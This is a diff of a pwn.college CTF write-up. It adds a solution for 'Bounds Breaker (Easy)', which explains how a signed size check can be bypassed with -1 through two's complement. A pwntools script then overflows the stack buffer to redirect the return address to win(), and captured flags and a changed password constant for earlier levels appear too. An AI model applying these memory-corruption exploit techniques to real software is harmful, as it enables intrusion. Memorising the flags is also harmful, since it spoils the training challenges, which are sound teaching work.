@@ -854,8 +854,6 @@ overwriting the return address, and the program would abort.
 Payload size: 
 ```
 
-### Disassembly
-
 Let's open the program within GDB.
 
 ```
@@ -894,7 +892,7 @@ Non-debugging symbols:
 0x00000000000022a8  _fini
 ```
 
-### `challenge()`
+## `challenge()`
 
 ```
 pwndbg> disassemble challenge
@@ -1268,7 +1266,7 @@ p = process('/challenge/login-leakage-easy')
 buffer_addr = 0x7ffccd0bfbe0
 password_addr = 0x7ffccd0c0336
 addr_of_saved_bp = 0x7ffe2e4a66a0
-password = 0xdeadbeef
+password = 0xdeadbeeffacade00
 
 # Calculate offset & payload_size
 offset = password_addr - buffer_addr
@@ -1321,6 +1319,8 @@ $
 
 ## Login leakage (Hard)
 
+> Leverage memory corruption to satisfy a simple constraint
+
 ```
 hacker@program-security~login-leakage-hard:/$ /challenge/login-leakage-hard 
 Payload size: 2
@@ -1335,8 +1335,6 @@ Requirements to craft an exploit:
 
 * [ ] Location of buffer
 * [ ] Location of password
-
-### Disassembly
 
 ```
 pwndbg> info functions
@@ -1373,7 +1371,7 @@ Non-debugging symbols:
 pwndbg> 
 ```
 
-#### `challenge()`
+### `challenge()`
 
 ```
 pwndbg> disassemble challenge
@@ -1543,7 +1541,7 @@ p = process('/challenge/login-leakage-hard')
 buffer_addr = 0x7ffd75790bf0
 password_addr = 0x7ffd75791218
 # addr_of_saved_bp = 0x7ffe2e4a66a0
-password = 0xdeadbeef
+password = 0xdeadbeeffacade00
 
 # Calculate offset & payload_size
 offset = password_addr - buffer_addr
@@ -1579,6 +1577,512 @@ pwn.college{MQmBteRVgsAkLzTDm3hAjp7roKm.QXxgzN4EDL4ITM0EzW}
 
 
 Goodbye!
+[*] Got EOF while reading in interactive
+$  
+```
+
+&nbsp;
+
+## Bounds Breaker (Easy)
+
+```
+hacker@program-security~bounds-breaker-easy:~$ /challenge/bounds-breaker-easy 
+###
+### Welcome to /challenge/bounds-breaker-easy!
+###
+
+The challenge() function has just been launched!
+Before we do anything, let's take a look at challenge()'s stack frame:
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffcefa6de50 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
+| 0x00007ffcefa6de58 (rsp+0x0008) | 38 f0 a6 ef fc 7f 00 00 | 0x00007ffcefa6f038 |
+| 0x00007ffcefa6de60 (rsp+0x0010) | 28 f0 a6 ef fc 7f 00 00 | 0x00007ffcefa6f028 |
+| 0x00007ffcefa6de68 (rsp+0x0018) | 23 27 9a 16 01 00 00 00 | 0x00000001169a2723 |
+| 0x00007ffcefa6de70 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007ffcefa6de78 (rsp+0x0028) | 51 59 84 16 00 00 00 00 | 0x0000000016845951 |
+| 0x00007ffcefa6de80 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6de88 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6de90 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6de98 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6dea0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6dea8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6deb0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6deb8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6dec0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6dec8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6ded0 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6ded8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6dee0 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6dee8 (rsp+0x0098) | 00 00 40 00 00 00 00 00 | 0x0000000000400000 |
+| 0x00007ffcefa6def0 (rsp+0x00a0) | 30 ef a6 ef fc 7f 00 00 | 0x00007ffcefa6ef30 |
+| 0x00007ffcefa6def8 (rsp+0x00a8) | 80 de a6 ef fc 7f 00 00 | 0x00007ffcefa6de80 |
+| 0x00007ffcefa6df00 (rsp+0x00b0) | 30 ef a6 ef fc 7f 00 00 | 0x00007ffcefa6ef30 |
+| 0x00007ffcefa6df08 (rsp+0x00b8) | dd 28 40 00 00 00 00 00 | 0x00000000004028dd |
++---------------------------------+-------------------------+--------------------+
+Our stack pointer points to 0x7ffcefa6de50, and our base pointer points to 0x7ffcefa6df00.
+This means that we have (decimal) 24 8-byte words in our stack frame,
+including the saved base pointer and the saved return address, for a
+total of 192 bytes.
+The input buffer begins at 0x7ffcefa6de80, partway through the stack frame,
+("above" it in the stack are other local variables used by the function).
+Your input will be read into this buffer.
+The buffer is 106 bytes long, but the program will let you provide an arbitrarily
+large input length, and thus overflow the buffer.
+
+In this level, there is no "win" variable.
+You will need to force the program to execute the win() function
+by directly overflowing into the stored return address back to main,
+which is stored at 0x7ffcefa6df08, 136 bytes after the start of your input buffer.
+That means that you will need to input at least 144 bytes (106 to fill the buffer,
+30 to fill other stuff stored between the buffer and the return address,
+and 8 that will overwrite the return address).
+
+We have disabled the following standard memory corruption mitigations for this challenge:
+- the canary is disabled, otherwise you would corrupt it before
+overwriting the return address, and the program would abort.
+- the binary is *not* position independent. This means that it will be
+located at the same spot every time it is run, which means that by
+analyzing the binary (using objdump or reading this output), you can
+know the exact value that you need to overwrite the return address with.
+
+Payload size: 2
+This challenge is more careful: it will check to make sure you
+don't want to provide so much data that the input buffer will
+overflow. But recall twos compliment, look at how the check is
+implemented, and try to beat it!
+You made it past the check! Because the read() call will interpret
+your size differently than the check above, the resulting read will
+be unstable and might fail. You will likely have to try this several
+times before your input is actually read.
+You have chosen to send 2 bytes of input!
+This will allow you to write from 0x7ffcefa6de80 (the start of the input buffer)
+right up to (but not including) 0x7ffcefa6de82 (which is -104 bytes beyond the end of the buffer).
+Of these, you will overwrite -134 bytes into the return address.
+If that number is greater than 8, you will overwrite the entire return address.
+
+You will want to overwrite the return value from challenge()
+(located at 0x7ffcefa6df08, 136 bytes past the start of the input buffer)
+with 0x4020f3, which is the address of the win() function.
+This will cause challenge() to return directly into the win() function,
+which will in turn give you the flag.
+Keep in mind that you will need to write the address of the win() function
+in little-endian (bytes backwards) so that it is interpreted properly.
+
+Send your payload (up to 2 bytes)!
+aa
+You sent 2 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffcefa6de50 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
+| 0x00007ffcefa6de58 (rsp+0x0008) | 38 f0 a6 ef fc 7f 00 00 | 0x00007ffcefa6f038 |
+| 0x00007ffcefa6de60 (rsp+0x0010) | 28 f0 a6 ef fc 7f 00 00 | 0x00007ffcefa6f028 |
+| 0x00007ffcefa6de68 (rsp+0x0018) | 23 27 9a 16 01 00 00 00 | 0x00000001169a2723 |
+| 0x00007ffcefa6de70 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007ffcefa6de78 (rsp+0x0028) | 51 59 84 16 02 00 00 00 | 0x0000000216845951 |
+| 0x00007ffcefa6de80 (rsp+0x0030) | 61 61 00 00 00 00 00 00 | 0x0000000000006161 |
+| 0x00007ffcefa6de88 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6de90 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6de98 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6dea0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6dea8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6deb0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6deb8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6dec0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6dec8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6ded0 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6ded8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6dee0 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffcefa6dee8 (rsp+0x0098) | 00 00 40 00 00 00 00 00 | 0x0000000000400000 |
+| 0x00007ffcefa6def0 (rsp+0x00a0) | 30 ef a6 ef 02 00 00 00 | 0x00000002efa6ef30 |
+| 0x00007ffcefa6def8 (rsp+0x00a8) | 80 de a6 ef fc 7f 00 00 | 0x00007ffcefa6de80 |
+| 0x00007ffcefa6df00 (rsp+0x00b0) | 30 ef a6 ef fc 7f 00 00 | 0x00007ffcefa6ef30 |
+| 0x00007ffcefa6df08 (rsp+0x00b8) | dd 28 40 00 00 00 00 00 | 0x00000000004028dd |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7ffcefa6de80
+- the saved frame pointer (of main) is at 0x7ffcefa6df00
+- the saved return address (previously to main) is at 0x7ffcefa6df08
+- the saved return address is now pointing to 0x4028dd.
+- the address of win() is 0x4020f3.
+
+If you have managed to overwrite the return address with the correct value,
+challenge() will jump straight to win() when it returns.
+Let's try it now!
+
+Goodbye!
+### Goodbye!
+```
+
+```
+hacker@program-security~bounds-breaker-easy:~$ /challenge/bounds-breaker-easy 
+###
+### Welcome to /challenge/bounds-breaker-easy!
+###
+
+The challenge() function has just been launched!
+Before we do anything, let's take a look at challenge()'s stack frame:
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffeb0dd38b0 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
+| 0x00007ffeb0dd38b8 (rsp+0x0008) | 98 4a dd b0 fe 7f 00 00 | 0x00007ffeb0dd4a98 |
+| 0x00007ffeb0dd38c0 (rsp+0x0010) | 88 4a dd b0 fe 7f 00 00 | 0x00007ffeb0dd4a88 |
+| 0x00007ffeb0dd38c8 (rsp+0x0018) | 23 27 86 bc 01 00 00 00 | 0x00000001bc862723 |
+| 0x00007ffeb0dd38d0 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007ffeb0dd38d8 (rsp+0x0028) | 51 59 70 bc 00 00 00 00 | 0x00000000bc705951 |
+| 0x00007ffeb0dd38e0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffeb0dd38e8 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffeb0dd38f0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffeb0dd38f8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffeb0dd3900 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffeb0dd3908 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffeb0dd3910 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffeb0dd3918 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffeb0dd3920 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffeb0dd3928 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffeb0dd3930 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffeb0dd3938 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffeb0dd3940 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffeb0dd3948 (rsp+0x0098) | 00 00 40 00 00 00 00 00 | 0x0000000000400000 |
+| 0x00007ffeb0dd3950 (rsp+0x00a0) | 90 49 dd b0 fe 7f 00 00 | 0x00007ffeb0dd4990 |
+| 0x00007ffeb0dd3958 (rsp+0x00a8) | e0 38 dd b0 fe 7f 00 00 | 0x00007ffeb0dd38e0 |
+| 0x00007ffeb0dd3960 (rsp+0x00b0) | 90 49 dd b0 fe 7f 00 00 | 0x00007ffeb0dd4990 |
+| 0x00007ffeb0dd3968 (rsp+0x00b8) | dd 28 40 00 00 00 00 00 | 0x00000000004028dd |
++---------------------------------+-------------------------+--------------------+
+Our stack pointer points to 0x7ffeb0dd38b0, and our base pointer points to 0x7ffeb0dd3960.
+This means that we have (decimal) 24 8-byte words in our stack frame,
+including the saved base pointer and the saved return address, for a
+total of 192 bytes.
+The input buffer begins at 0x7ffeb0dd38e0, partway through the stack frame,
+("above" it in the stack are other local variables used by the function).
+Your input will be read into this buffer.
+The buffer is 106 bytes long, but the program will let you provide an arbitrarily
+large input length, and thus overflow the buffer.
+
+In this level, there is no "win" variable.
+You will need to force the program to execute the win() function
+by directly overflowing into the stored return address back to main,
+which is stored at 0x7ffeb0dd3968, 136 bytes after the start of your input buffer.
+That means that you will need to input at least 144 bytes (106 to fill the buffer,
+30 to fill other stuff stored between the buffer and the return address,
+and 8 that will overwrite the return address).
+
+We have disabled the following standard memory corruption mitigations for this challenge:
+- the canary is disabled, otherwise you would corrupt it before
+overwriting the return address, and the program would abort.
+- the binary is *not* position independent. This means that it will be
+located at the same spot every time it is run, which means that by
+analyzing the binary (using objdump or reading this output), you can
+know the exact value that you need to overwrite the return address with.
+
+Payload size: 107
+This challenge is more careful: it will check to make sure you
+don't want to provide so much data that the input buffer will
+overflow. But recall twos compliment, look at how the check is
+implemented, and try to beat it!
+Provided size is too large!
+```
+
+This challenge checks if the payload size entered by the user overflows the length of the buffer. If yes, it exits early without reading the payload.
+
+It does hint somehting about using a two's complement but we'll se when we get there.
+
+### `challenge()`
+
+```
+pwndbg> disassemble challenge
+
+# --- snip ---
+
+   0x00000000004024fc <+770>:   call   0x401180 <__isoc99_scanf@plt>
+   0x0000000000402501 <+775>:   lea    rdi,[rip+0x13b0]        # 0x4038b8
+   0x0000000000402508 <+782>:   call   0x401110 <puts@plt>
+   0x000000000040250d <+787>:   lea    rdi,[rip+0x13e4]        # 0x4038f8
+   0x0000000000402514 <+794>:   call   0x401110 <puts@plt>
+   0x0000000000402519 <+799>:   lea    rdi,[rip+0x1418]        # 0x403938
+   0x0000000000402520 <+806>:   call   0x401110 <puts@plt>
+   0x0000000000402525 <+811>:   lea    rdi,[rip+0x144c]        # 0x403978
+   0x000000000040252c <+818>:   call   0x401110 <puts@plt>
+   0x0000000000402531 <+823>:   mov    eax,DWORD PTR [rbp-0x84]
+   0x0000000000402537 <+829>:   cmp    eax,0x6a
+   0x000000000040253a <+832>:   jle    0x402552 <challenge+856>
+   0x000000000040253c <+834>:   lea    rdi,[rip+0x1456]        # 0x403999
+   0x0000000000402543 <+841>:   call   0x401110 <puts@plt>
+   0x0000000000402548 <+846>:   mov    edi,0x1
+   0x000000000040254d <+851>:   call   0x401190 <exit@plt>
+   0x0000000000402552 <+856>:   lea    rdi,[rip+0x145f]        # 0x4039b8
+   0x0000000000402559 <+863>:   call   0x401110 <puts@plt>
+   0x000000000040255e <+868>:   lea    rdi,[rip+0x149b]        # 0x403a00
+
+# --- snip ---
+
+   0x00000000004026b3 <+1209>:  mov    eax,DWORD PTR [rbp-0x84]
+   0x00000000004026b9 <+1215>:  mov    edx,eax
+   0x00000000004026bb <+1217>:  mov    rax,QWORD PTR [rbp-0x8]
+   0x00000000004026bf <+1221>:  mov    rsi,rax
+   0x00000000004026c2 <+1224>:  mov    edi,0x0
+   0x00000000004026c7 <+1229>:  call   0x401150 <read@plt>
+
+# --- snip ---
+```
+
+Whatever payload size we send, is stored at the address pointed to by `rbp-0x84`. 
+
+Then the program compares that value with `0x6a`. If the value is lesser, it skips the `exit@plt` call and continues execution.
+
+Later, the same value is moved in `rax`, and then moved into `rdx` before making the call to `read@plt`, where it is treated as the count of bytes to be read.
+
+```c
+ssize_t read(int fd, void buf[.count], size_t count);
+```
+
+| arg0 (%rdi)     | arg1 (%rsi) | arg2 (%rdx)  | 
+| :----------     | :---------- | :----------- |
+| unsigned int fd | char *buf   | size_t count |
+
+This is where the hint comes into play.
+
+### [Two's compliment](https://en.wikipedia.org/wiki/Two%27s_complement)
+
+It is additive inverse operation, so negative numbers are represented by the two's complement of the absolute value. Let's look at an example.
+
+```
+## Negative number: 
+
+-1
+
+
+## Absolute value: 
+
+1 
+00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000001
+
+
+## One's compliment: 
+
+11111111 11111111 11111111 11111111 11111111 11111111 11111111 11111110
+
+
+## Two's complement: 
+
+11111111 11111111 11111111 11111111 11111111 11111111 11111111 11111110
++                                                                     1
+-----------------------------------------------------------------------
+11111111 11111111 11111111 11111111 11111111 11111111 11111111 11111111
+```
+
+Therefore the 64-bit two's compliment of -1 is `0xffffffffffffffff`.
+
+Let's look at how the program behaves if we provide the `-1` as the length of our payload size.
+
+```
+# --- snip ---
+
+   0x0000000000402531 <+823>:   mov    eax,DWORD PTR [rbp-0x84]
+   0x0000000000402537 <+829>:   cmp    eax,0x6a
+   0x000000000040253a <+832>:   jle    0x402552 <challenge+856>
+
+# --- snip ---
+```
+
+In the above snippet, `jle` is used for signed comparison. As `-1 < 0x6a`, the condition will be satisfied, the program will not exit.
+
+```
+# --- snip ---
+
+   0x00000000004026b3 <+1209>:  mov    eax,DWORD PTR [rbp-0x84]
+   0x00000000004026b9 <+1215>:  mov    edx,eax
+   0x00000000004026bb <+1217>:  mov    rax,QWORD PTR [rbp-0x8]
+   0x00000000004026bf <+1221>:  mov    rsi,rax
+   0x00000000004026c2 <+1224>:  mov    edi,0x0
+   0x00000000004026c7 <+1229>:  call   0x401150 <read@plt>
+
+# --- snip ---
+```
+
+As we saw before, `edx` holds the argument which specifies the number of bytes to be read. The problem is, number of bytes can never be negative, so `reads@plt` treats this argument as an unsigned integer. Thus `0xffffffffffffffff` is not interpreted as `-1` but rather as `18446744073709551615`.
+
+```py
+In [1]: 0xffffffffffffffff
+Out[1]: 18446744073709551615
+```
+
+As a result of this mismatch between how `jle` and `reads@plt` interpret our payload size input, we are able to pass the check, and overflow the buffer.
+
+### `win()`
+
+```
+hacker@program-security~bounds-breaker-easy:~$ objdump --disassemble=win -M intel /challenge/bounds-breaker-easy 
+
+/challenge/bounds-breaker-easy:     file format elf64-x86-64
+
+
+Disassembly of section .init:
+
+Disassembly of section .plt:
+
+Disassembly of section .plt.sec:
+
+Disassembly of section .text:
+
+00000000004020f3 <win>:
+  4020f3:       f3 0f 1e fa             endbr64
+  4020f7:       55                      push   rbp
+  4020f8:       48 89 e5                mov    rbp,rsp
+  4020fb:       48 8d 3d ee 0f 00 00    lea    rdi,[rip+0xfee]        # 4030f0 <_IO_stdin_used+0xf0>
+  402102:       e8 09 f0 ff ff          call   401110 <puts@plt>
+  402107:       be 00 00 00 00          mov    esi,0x0
+  40210c:       48 8d 3d f9 0f 00 00    lea    rdi,[rip+0xff9]        # 40310c <_IO_stdin_used+0x10c>
+  402113:       b8 00 00 00 00          mov    eax,0x0
+  402118:       e8 53 f0 ff ff          call   401170 <open@plt>
+  40211d:       89 05 1d 3f 00 00       mov    DWORD PTR [rip+0x3f1d],eax        # 406040 <flag_fd.5714>
+  402123:       8b 05 17 3f 00 00       mov    eax,DWORD PTR [rip+0x3f17]        # 406040 <flag_fd.5714>
+  402129:       85 c0                   test   eax,eax
+  40212b:       79 4d                   jns    40217a <win+0x87>
+  40212d:       e8 ce ef ff ff          call   401100 <__errno_location@plt>
+  402132:       8b 00                   mov    eax,DWORD PTR [rax]
+  402134:       89 c7                   mov    edi,eax
+  402136:       e8 65 f0 ff ff          call   4011a0 <strerror@plt>
+  40213b:       48 89 c6                mov    rsi,rax
+  40213e:       48 8d 3d d3 0f 00 00    lea    rdi,[rip+0xfd3]        # 403118 <_IO_stdin_used+0x118>
+  402145:       b8 00 00 00 00          mov    eax,0x0
+  40214a:       e8 e1 ef ff ff          call   401130 <printf@plt>
+  40214f:       e8 ec ef ff ff          call   401140 <geteuid@plt>
+  402154:       85 c0                   test   eax,eax
+  402156:       74 18                   je     402170 <win+0x7d>
+  402158:       48 8d 3d e9 0f 00 00    lea    rdi,[rip+0xfe9]        # 403148 <_IO_stdin_used+0x148>
+  40215f:       e8 ac ef ff ff          call   401110 <puts@plt>
+  402164:       48 8d 3d 05 10 00 00    lea    rdi,[rip+0x1005]        # 403170 <_IO_stdin_used+0x170>
+  40216b:       e8 a0 ef ff ff          call   401110 <puts@plt>
+  402170:       bf ff ff ff ff          mov    edi,0xffffffff
+  402175:       e8 16 f0 ff ff          call   401190 <exit@plt>
+  40217a:       8b 05 c0 3e 00 00       mov    eax,DWORD PTR [rip+0x3ec0]        # 406040 <flag_fd.5714>
+  402180:       ba 00 01 00 00          mov    edx,0x100
+  402185:       48 8d 35 d4 3e 00 00    lea    rsi,[rip+0x3ed4]        # 406060 <flag.5713>
+  40218c:       89 c7                   mov    edi,eax
+  40218e:       e8 bd ef ff ff          call   401150 <read@plt>
+  402193:       89 05 c7 3f 00 00       mov    DWORD PTR [rip+0x3fc7],eax        # 406160 <flag_length.5715>
+  402199:       8b 05 c1 3f 00 00       mov    eax,DWORD PTR [rip+0x3fc1]        # 406160 <flag_length.5715>
+  40219f:       85 c0                   test   eax,eax
+  4021a1:       7f 2c                   jg     4021cf <win+0xdc>
+  4021a3:       e8 58 ef ff ff          call   401100 <__errno_location@plt>
+  4021a8:       8b 00                   mov    eax,DWORD PTR [rax]
+  4021aa:       89 c7                   mov    edi,eax
+  4021ac:       e8 ef ef ff ff          call   4011a0 <strerror@plt>
+  4021b1:       48 89 c6                mov    rsi,rax
+  4021b4:       48 8d 3d 0d 10 00 00    lea    rdi,[rip+0x100d]        # 4031c8 <_IO_stdin_used+0x1c8>
+  4021bb:       b8 00 00 00 00          mov    eax,0x0
+  4021c0:       e8 6b ef ff ff          call   401130 <printf@plt>
+  4021c5:       bf ff ff ff ff          mov    edi,0xffffffff
+  4021ca:       e8 c1 ef ff ff          call   401190 <exit@plt>
+  4021cf:       8b 05 8b 3f 00 00       mov    eax,DWORD PTR [rip+0x3f8b]        # 406160 <flag_length.5715>
+  4021d5:       48 98                   cdqe
+  4021d7:       48 89 c2                mov    rdx,rax
+  4021da:       48 8d 35 7f 3e 00 00    lea    rsi,[rip+0x3e7f]        # 406060 <flag.5713>
+  4021e1:       bf 01 00 00 00          mov    edi,0x1
+  4021e6:       e8 35 ef ff ff          call   401120 <write@plt>
+  4021eb:       48 8d 3d 00 10 00 00    lea    rdi,[rip+0x1000]        # 4031f2 <_IO_stdin_used+0x1f2>
+  4021f2:       e8 19 ef ff ff          call   401110 <puts@plt>
+  4021f7:       90                      nop
+  4021f8:       5d                      pop    rbp
+  4021f9:       c3                      ret
+
+Disassembly of section .fini:
+```
+
+Before we write the exploit, let's get the address of the `win()` function.
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process('/challenge/bounds-breaker-easy')
+
+# Initialize values
+buffer_addr = 0x7ffcae8fa380
+addr_of_stored_ip = 0x7ffcae8fa408
+win_func_addr = 0x4020f3
+
+# Calculate offset & payload_size
+offset = addr_of_stored_ip - buffer_addr
+payload_size = -1
+
+# Build payload
+payload = b"A" * offset
+payload += p64(win_func_addr)
+
+# Send number of bytes
+p.recvuntil(b'Payload size: ')
+p.sendline(str(payload_size))
+
+# Send payload
+p.recvuntil(b'Send your payload')
+p.send(payload)
+
+p.interactive() 
+```
+
+```
+hacker@program-security~bounds-breaker-easy:~$ python ~/script.py 
+[+] Starting local process '/challenge/bounds-breaker-easy': pid 36721
+/home/hacker/script.py:20: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendline(str(payload_size))
+[*] Switching to interactive mode
+ (up to -1 bytes)!
+[*] Process '/challenge/bounds-breaker-easy' stopped with exit code -11 (SIGSEGV) (pid 36721)
+You sent 144 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffeffbedca0 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
+| 0x00007ffeffbedca8 (rsp+0x0008) | 88 ee be ff fe 7f 00 00 | 0x00007ffeffbeee88 |
+| 0x00007ffeffbedcb0 (rsp+0x0010) | 78 ee be ff fe 7f 00 00 | 0x00007ffeffbeee78 |
+| 0x00007ffeffbedcb8 (rsp+0x0018) | 23 b7 54 7e 01 00 00 00 | 0x000000017e54b723 |
+| 0x00007ffeffbedcc0 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007ffeffbedcc8 (rsp+0x0028) | 51 e9 3e 7e ff ff ff ff | 0xffffffff7e3ee951 |
+| 0x00007ffeffbedcd0 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffeffbedcd8 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffeffbedce0 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffeffbedce8 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffeffbedcf0 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffeffbedcf8 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffeffbedd00 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffeffbedd08 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffeffbedd10 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffeffbedd18 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffeffbedd20 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffeffbedd28 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffeffbedd30 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffeffbedd38 (rsp+0x0098) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffeffbedd40 (rsp+0x00a0) | 41 41 41 41 90 00 00 00 | 0x0000009041414141 |
+| 0x00007ffeffbedd48 (rsp+0x00a8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffeffbedd50 (rsp+0x00b0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffeffbedd58 (rsp+0x00b8) | f3 20 40 00 00 00 00 00 | 0x00000000004020f3 |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x4141414141414141
+- the saved frame pointer (of main) is at 0x7ffeffbedd50
+- the saved return address (previously to main) is at 0x7ffeffbedd58
+- the saved return address is now pointing to 0x4020f3.
+- the address of win() is 0x4020f3.
+
+If you have managed to overwrite the return address with the correct value,
+challenge() will jump straight to win() when it returns.
+Let's try it now!
+
+Goodbye!
+You win! Here is your flag:
+pwn.college{cqqx0Foh8TX0nmHtTa2208nl4Ry.0VN5IDL4ITM0EzW}
+
+
 [*] Got EOF while reading in interactive
 $  
 ```
